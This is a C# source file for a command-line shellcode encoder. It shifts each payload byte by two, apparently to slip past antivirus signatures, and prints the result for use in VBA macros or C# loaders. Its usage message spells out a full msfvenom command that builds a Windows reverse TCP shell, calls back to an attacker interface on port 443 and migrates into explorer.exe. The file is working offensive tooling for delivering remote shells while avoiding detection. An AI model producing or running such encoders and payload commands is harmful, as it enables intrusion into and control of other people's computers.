using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Linq;

namespace Helper
{
    public class CommandContext
    {
        public Dictionary<string, string> Parameters { get; } = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

        public CommandContext(string[] args)
        {
            ParseArgumentsWithEquals(args);
        }

        private void ParseArgumentsWithEquals(string[] args)
        {
            foreach (string arg in args)
            {
                if ((arg.StartsWith("/") || arg.StartsWith("-")) && arg.Length > 1)
                {
                    string cleanArg = arg.Substring(1); // Remove / or -

                    if (cleanArg.Contains('='))
                    {
                        // Format: /key=value
                        string[] parts = cleanArg.Split('=', (char)2);
                        if (parts.Length == 2)
                        {
                            Parameters[parts[0]] = parts[1];
                        }
                    }
                    else
                    {
                        // Format: /key (flag without value)
                        Parameters[cleanArg] = "true";
                    }
                }
            }
        }

        public string this[string key] => Parameters.ContainsKey(key.ToLower()) ? Parameters[key.ToLower()] : null;

        public bool HasKey(string key) => Parameters.ContainsKey(key.ToLower());

        public int GetInt(string key, int defaultValue = 0)
        {
            return int.TryParse(this[key], out int result) ? result : defaultValue;
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string exeFileName = System.IO.Path.GetFileName(exePath);
            var context = new CommandContext(args);


            if (context["code"] == null || context["f"] == null)
            {
                Console.WriteLine($"Usage: {exeFileName} /f=<vba/csharp> /code=0xfc,0xe9,...\n\tmsfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread PrependMigrate=true PrependMigrateProcess=explorer.exe -f csharp | tr -d \'\\n\\r\'");
                System.Environment.Exit(0);

            }

            try
            {
                // Extract the hex string from command line
                string hexInput = context["code"];

                // Parse hex string to byte array
                byte[] buf = ParseHexString(hexInput);

                // Encode the bytes
                byte[] encoded = new byte[buf.Length];
                for (int i = 0; i < buf.Length; i++)
                {
                    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                }

                // Format output
                uint counter = 0;
                StringBuilder hex = new StringBuilder(encoded.Length * 4);

                if (context["f"] == "vba")
                {
                    foreach (byte b in encoded)
                    {
                        hex.AppendFormat("{0:D}, ", b);
                        counter++;
                        if (counter % 50 == 0)
                        {
                            hex.AppendFormat("_{0}", Environment.NewLine);
                        }
                    }

                    hex.Remove(hex.Length - 1, 1);

                }
                else if (context["f"] == "csharp")
                {
                    foreach (byte b in encoded)
                    {
                        hex.AppendFormat("0x{0:x2},", b);
                    }


                }

                hex.Remove(hex.Length - 1, 1);

                Console.WriteLine("=====");
                Console.WriteLine("The encode payload is: " + hex.ToString());
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        static byte[] ParseHexString(string hexString)
        {
            // Remove any spaces and split by commas
            string[] hexValues = hexString.Replace(" ", "").Split(',');
            byte[] bytes = new byte[hexValues.Length];

            for (int i = 0; i < hexValues.Length; i++)
            {
                string hex = hexValues[i].Trim();
                if (hex.StartsWith("0x"))
                {
                    hex = hex.Substring(2);
                }
                bytes[i] = Convert.ToByte(hex, 16);
            }

            return bytes;
        }
    }


}
